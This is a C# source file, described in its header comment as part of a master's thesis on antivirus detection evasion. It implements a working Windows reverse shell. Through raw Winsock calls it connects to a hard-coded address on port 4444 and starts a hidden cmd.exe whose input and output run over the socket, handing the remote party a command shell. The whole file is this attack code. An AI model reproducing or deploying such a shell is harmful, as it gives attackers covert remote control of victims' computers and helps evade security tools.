///----------------------------------------------------------------------------------------------------------------------------------------------------------------------
/// This implementation is part of my master's thesis regarding antivirus detection evasion. 
///  C Vorlage: https://github.com/izenynn/c-reverse-shell/blob/main/windows.c
///  C# Beispiel für Structs: https://pastebin.com/twvGw030
///----------------------------------------------------------------------------------------------------------------------------------------------------------------------
namespace SimpleReverseShell
{
  using System.Net.Sockets;
  using System.Runtime.InteropServices;

  internal class SimpleSysCallShell : DllImportsBase
  {
    public void Start()
    {
      var wsa = new WSAData();
      var statusCode = WSAStartup((ushort)2.2, wsa);

      PrintLastError(nameof(WSAStartup));

      var sockAddrIn = new sockaddr_in();
      sockAddrIn.sin_family = 2;
      sockAddrIn.sin_port = htons(4444);
      PrintLastError(nameof(htons));

      sockAddrIn.sin_addr.S_addr = inet_addr("192.168.0.187");
      PrintLastError(nameof(inet_addr));

      var sockAddrInPtr = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIn));
      Marshal.StructureToPtr(sockAddrIn, sockAddrInPtr, false);

      var sockAddr = Marshal.PtrToStructure<sockaddr>(sockAddrInPtr);

      var socket = WSASocketA(2, 1, 6, IntPtr.Zero, 0, 0);
      PrintLastError(nameof(WSASocketA));

      var addrPointer = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddr));
      Marshal.StructureToPtr(sockAddr, addrPointer, false);
      var connectSuccess = connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
      PrintLastError(nameof(connect));

      var socketHandle = new SafeSocketHandle(socket, false);
      STARTUPINFO startupInfo = new STARTUPINFO();
      Marshal.AllocHGlobal(Marshal.SizeOf(startupInfo));
      startupInfo.cb = Marshal.SizeOf(startupInfo);
      startupInfo.dwFlags = CreationFlags.STARTF_USESTDHANDLES;
      startupInfo.hStdInput = socketHandle.DangerousGetHandle();
      startupInfo.hStdOutput = socketHandle.DangerousGetHandle();
      startupInfo.hStdError = socketHandle.DangerousGetHandle();
      PROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
      CreateProcessA(null, @"C:\\Windows\\System32\\cmd.exe", IntPtr.Zero, IntPtr.Zero, true, CreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, ref pinfo);
      PrintLastError(nameof(CreateProcessA));
    }

    private void PrintLastError(string method)
    {
      var lastError = WSAGetLastError();

      if (lastError != 0)
      {
        Console.WriteLine($"Last error in {method}: Error Code {lastError}");
        Console.ReadLine();
      }
      else
        Console.WriteLine($"Method {method} completed without errors");
    }
  }
}
